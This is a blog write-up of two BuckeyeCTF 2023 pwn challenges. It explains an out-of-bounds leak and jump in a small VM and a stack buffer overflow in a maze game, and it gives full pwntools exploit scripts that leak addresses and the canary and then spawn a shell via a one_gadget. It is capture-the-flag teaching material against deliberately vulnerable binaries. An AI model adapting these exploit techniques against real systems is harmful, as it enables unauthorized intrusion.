---
layout: post
title: "BuckeyeCTF 2023 Pwnable Write up"
date: 2023-10-02 23:00:00 +0900
categories: [Security, CTF]
tags: [CTF, linux]
img_path: 20231002_buckeye_write-up
image: 1.jpg
---

I solved 4 pwn (Beginner Menu, Starter Buffer, Bugsworld, and Frog Universe in C), 1 crypto (coding), and 1 misc (New Management).

## **Bugsworld**

---

### **[0x00] Description**

> The original BUGSWORLD interpreter was too slow because it was written in JAVA. This new one is 100x faster probably because it's written in C!
> 
> Author: jm8
> 
> 36 solves

### **[0x01] Summary**

Simple VM, OOB Leak, and OOB Execute vulnerability

### **[0x02] Solutions**

We can enter the instructions of the game, and the game validates the instructions and execute it.

It has 2 vulnerability. First is OOB Leak.

```c
  // show the disassembly and validate program
  for (int i = 0; i < n; i++) {
    // write first and jump to it.
    printf("%s", instruction_names[bytecode[i]]);
    if (bytecode[i] < 0 || bytecode[i] > 16) {
      printf("Invalid instruction\n");
      return;
    }
    if (bytecode[i] >= INSTRUCTION_JUMP) {
      i++;
      printf(" %ld\n", bytecode[i]);
    } else {
      printf("\n");
    }
  }
```
The game validates the instructions but it prints the contents of the instructions first.

So, we can print PIE base through OOB leak. I print the `do_move` function pointer (0x2040 + 0x20 * 0xFF).

Second one is OOB Execution and absent of initilaization.

```c
void do_jump(State *state) {
  state->pc++;
  state->pc = bytecode[state->pc]; // oob
}
```

The game jumps to the next instructions without oob check and bytecode array never be initialized with zero.

So prev bytecode is remain at the next instrucitons and we can use the bytecode beyond the instruction range.

It means that we can execute any address and control RIP. Nicely the program has `win` function.

```py
from pwn import *

def writeProgram(size, prog):
    p.sendlineafter(b"bytecode?\n> ", str(size).encode())
    p.recvuntil(b"instructions:\n> ")
    for i in range (size):
        p.sendline(str(prog[i]).encode())

if args.REMOTE:
    p = remote('chall.pwnoh.io', 13382)
else:
    p = process('./bugsworld', aslr=1)

# leak pie
writeProgram(1, [0xfa + 5])
pie = u64(p.recv(6).ljust(8, b'\x00')) - 0x134d
log.success(f"pie base @ {hex(pie)}")
win = pie + 0x12a9

writeProgram(5, [0, 0, 0, 0x1c, win])
writeProgram(2, [6, 3])

p.interactive()
```

`bctf{7h3_w0rld_15_fu11_0f_bu65_295c62b69}`

## **Frog Universe in C (FUC)**

---

### **[0x00] Description**

> ... There are leaks in the buffers to be found
> 
> Author: kirin <3 gsemaj
> 
> 10 solves

### **[0x01] Summary**

Simple game with Random and Stack BOF until RET + 8

### **[0x02] Solutions**

The game is maze and it has movement of up, down, left, and right.

After a initialization of maze, `explore` function is called.

```c
unsigned __int64 explore()
{
  char v1; // [rsp+3h] [rbp-Dh] BYREF
  int i; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  for ( i = 1; i; i = sub_2D2F() )
  {
    printf("(%i, %i)\n", (unsigned int)MAZE->X, (unsigned int)MAZE->Y);
    input(&v1, 0x25);
    switch ( v1 )
    {
      case 'w':
        if ( MAZE->UPWARD )
          MAZE = MAZE->UPWARD;
        break;
      case 's':
        if ( MAZE->DOWNARD )
          MAZE = MAZE->DOWNARD;
        break;
      case 'a':
        if ( MAZE->LEFTWARD )
          MAZE = MAZE->LEFTWARD;
        break;
      case 'd':
        if ( MAZE->RIGHTWARD )
          MAZE = MAZE->RIGHTWARD;
        break;
      default:
        printf("Invalid input %s\n", &v1);
        break;
    }
  }
  return v3 - __readfsqword(0x28u);
}
```

Simply it has BOF at `v1`, and it prints the `v1` so we can leak Stack address and RET.

Using this, I can leak the Canary, Stack, PIE base, and libc base.

The maze is initialized with srand and rand complexly, but maze size is 400 x 400. I thought that brute-force works well enough.

Only we want is return condition of `explore` and many exit exists in maze.

```
0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
```

There is nice one_gadget for me and I use it with appropriate SFP, because we can control Stack until RET + 8 (0xD + 0x8 (SFP) + 0x10 (RET, RET+8) == 0x25).

```py
from pwn import *

p = remote('chall.pwnoh.io', 13387)
libc_path = '/usr/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc_path, False)

p.sendlineafter(b")\n", b'A'*6)
p.recvuntil(b"A"*6)
canary = u64(b'\x00' + p.recv(7))
log.success(f"Canary @ {hex(canary)}")

p.sendlineafter(b")\n", b'A'*5 + b'B'*0x8)
p.recvuntil(b"B"*0x8)
stack = u64(p.recv(6).ljust(8, b'\x00'))
target = stack - 0x48 + 0xD
log.success(f"stack @ {hex(stack)}")

p.sendlineafter(b")\n", b'A'*5 + b'B'*0x10)
p.recvuntil(b"B"*0x10)
pie = u64(p.recv(6).ljust(8, b'\x00')) - 0x3431
log.success(f"PIE @ {hex(pie)}")

payload = b'A' + p32(0) + p64(canary)
payload += p64(stack + 0x10) + p64(pie+0x2FCA)
p.sendlineafter(b")\n", payload)

# brute-force (server timeout 10-seconds maybe)
signals = ["it is crushing", "intense heat", "everything is light", "ribbity!",  "the frog...", "slurp"]
flag = True
while flag:
    p.sendline(b'd')
    data = p.recv()
    print(data)
    for s in signals:
        if s in data.decode():
            print(data)
            flag = False
            break


p.sendline(b'd'*5) 
p.sendlineafter(b")", b'c'*5) 
p.recvuntil(b"c"*5)
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - libc.libc_start_main_return
log.success(f"libc base @ {hex(libc.address)}")

one_gadget = libc.address + 0xebcf1
payload = b'a'* 5 + p64(canary)
payload += p64(stack + 0x80) + p64(one_gadget)
p.sendlineafter(b")\n", payload)
p.sendline(b'a')
p.sendline(b'cat /app/run')
p.interactive()
```

`bctf{YouHavePwndDeath,ToYouGoesAFlag}`

